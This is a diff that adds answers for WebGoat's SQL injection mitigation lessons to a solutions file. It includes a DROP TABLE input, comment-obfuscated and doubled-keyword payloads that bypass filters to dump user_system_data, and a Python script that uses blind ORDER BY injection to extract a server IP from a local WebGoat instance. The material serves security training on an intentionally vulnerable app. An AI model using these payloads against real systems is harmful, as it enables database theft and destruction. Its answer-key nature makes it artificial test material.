@@ -101,3 +101,66 @@ password: thisisasecretfortomonly
 5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?
 
 - Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.
+
+**SQL Injection (mitigation)**
+-
+*ex5*
+-
+- The fields must contain the following words to validate the lesson: getConnection, PreparedStatement, prepareStatement, ?, ?, setString, setString.
+
+*ex6*
+-
+try {  
+     Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);  
+     PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");  
+     ps.setString(1, "Admin");  
+     ps.executeUpdate();  
+} catch (Exception e) {  
+     System.out.println("Oops. Something went wrong!");  
+}
+
+*ex9*
+-
+a';/ ** /SELECT/ * * /*/ * */FROM/**/user_system_data--  (no space)
+
+*ex10*
+-
+a';/ ** /SESELECTLECT/ ** /*/ ** /FRFROMOM/**/user_system_data-- (no space)
+
+*ex12*
+-
+    import json  
+    import requests  
+    
+    def sql_injection_mitigation_10():  
+         index = 0  
+  
+         headers = {  
+                 'Cookie': 'JSESSIONID=E74AD097A71646AF92BC34822A1EB708'  
+         }  
+  
+         while True:  
+                 payload = '(CASE WHEN (SELECT ip FROM servers WHERE hostname=\'webgoat-prd\') LIKE \'{}.%\' THEN id ELSE hostname END)'.format(index)  
+  
+                 r = requests.get('http://127.0.0.1:8001/WebGoat/SqlInjectionMitigations/servers?column=' + payload, headers=headers)  
+  
+                 try:  
+                         response = json.loads(r.text)  
+                 except:  
+                         print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
+                         return  
+  
+                 if response[0]['id'] == '1':  
+                         print('webgoat-prd IP: {}.130.219.202'.format(index))  
+                         return  
+                 else:  
+                         index += 1  
+                         if index > 255:  
+                                 print("No IP found")  
+                                 return  
+  
+    sql_injection_mitigation_10()
+
+**Cross Site Scripting**
+
+
